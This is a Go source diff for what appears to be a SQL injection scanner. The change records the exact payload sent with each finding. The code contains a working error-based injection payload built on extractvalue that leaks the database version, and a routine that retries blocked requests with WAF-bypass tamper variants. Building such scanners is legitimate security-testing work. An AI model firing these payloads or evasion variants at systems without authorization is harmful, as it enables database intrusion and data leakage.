@@ -210,21 +210,21 @@ func toggleCase(s string) string {
 // sqliSendMaybeTamper sends value; if the response looks like a WAF/challenge
 // block, it retries with tamper variants and returns the first non-blocked body
 // plus the tamper description used ("" when the plain payload got through).
-func sqliSendMaybeTamper(ctx context.Context, ip insertionPoint, value string, auth map[string]string) (body string, tamper string) {
+func sqliSendMaybeTamper(ctx context.Context, ip insertionPoint, value string, auth map[string]string) (body string, sentPayload string, tamper string) {
 	body, _ = sendInjected(ctx, sqliHTTPClient, ip, value, auth)
 	if body != "" && !bodyLooksLikeWAFBlock(body) {
-		return body, ""
+		return body, value, ""
 	}
 	for i, v := range tamperVariants(value) {
 		if ctx.Err() != nil {
-			return body, ""
+			return body, value, ""
 		}
 		b, _ := sendInjected(ctx, sqliHTTPClient, ip, v, auth)
 		if b != "" && !bodyLooksLikeWAFBlock(b) {
-			return b, fmt.Sprintf("WAF-bypass tamper #%d applied (%q)", i+1, truncateTamper(v))
+			return b, v, fmt.Sprintf("WAF-bypass tamper #%d applied (%q)", i+1, truncateTamper(v))
 		}
 	}
-	return body, ""
+	return body, value, ""
 }
 
 func truncateTamper(v string) string {
@@ -355,8 +355,9 @@ func (s *SQLiScanner) secondOrderChecks(ctx context.Context, targetID string, ca
 	// Batching preserves exact write attribution while reducing that worst case to
 	// 20 + 2*30 = 80 requests.
 	type plantedWrite struct {
-		ip    insertionPoint
-		token string
+		ip      insertionPoint
+		token   string
+		payload string
 	}
 	plants := make([]plantedWrite, 0, len(writes))
 	for _, w := range writes {
@@ -367,7 +368,7 @@ func (s *SQLiScanner) secondOrderChecks(ctx context.Context, targetID string, ca
 		tokenHex := hex.EncodeToString([]byte(token))
 		payload := fmt.Sprintf("z' AND extractvalue(1,concat(0x7e,0x%s,0x7e,version()))-- -", tokenHex)
 		_, _ = sendInjected(ctx, sqliHTTPClient, w, payload, auth)
-		plants = append(plants, plantedWrite{ip: w, token: token})
+		plants = append(plants, plantedWrite{ip: w, token: token, payload: payload})
 	}
 
 	matched := make(map[string]bool, len(plants))
@@ -392,7 +393,7 @@ func (s *SQLiScanner) secondOrderChecks(ctx context.Context, targetID string, ca
 				if ver := extractLeakedVersionForMarker(body, p.token); ver != "" {
 					ev += fmt.Sprintf(" (leaked version: %s)", ver)
 				}
-				s.store(targetID, "sqli", "high", p.ip, "error_based", ev)
+				s.store(targetID, "sqli", "high", p.ip, "error_based", p.payload, ev)
 				found.Add(1)
 				matched[key] = true
 				logFn("warn", "sqli", fmt.Sprintf("Second-order SQLi CONFIRMED: %s param=%s", p.ip.URL, p.ip.Param))
@@ -419,13 +420,13 @@ func extractLeakedVersionForMarker(resp, marker string) string {
 
 // errorForceProbe runs the DBMS-adaptive error-forced extraction over an insertion
 // point. Returns ("error_based", evidence) on a proven extraction, else ("","").
-func (s *SQLiScanner) errorForceProbe(ctx context.Context, ip insertionPoint, auth map[string]string, baseline string) (string, string) {
+func (s *SQLiScanner) errorForceProbe(ctx context.Context, ip insertionPoint, auth map[string]string, baseline string) (string, string, string) {
 	for _, p := range sqliErrorForcePayloads() {
 		if ctx.Err() != nil {
-			return "", ""
+			return "", "", ""
 		}
 		value := sqliBaseValue(ip) + strings.TrimPrefix(p.value, "1")
-		resp, tamper := sqliSendMaybeTamper(ctx, ip, value, auth)
+		resp, sentPayload, tamper := sqliSendMaybeTamper(ctx, ip, value, auth)
 		if resp == "" {
 			continue
 		}
@@ -448,7 +449,7 @@ func (s *SQLiScanner) errorForceProbe(ctx context.Context, ip insertionPoint, au
 		if tamper != "" {
 			ev += " · " + tamper
 		}
-		return "error_based", ev
+		return "error_based", sentPayload, ev
 	}
-	return "", ""
+	return "", "", ""
 }
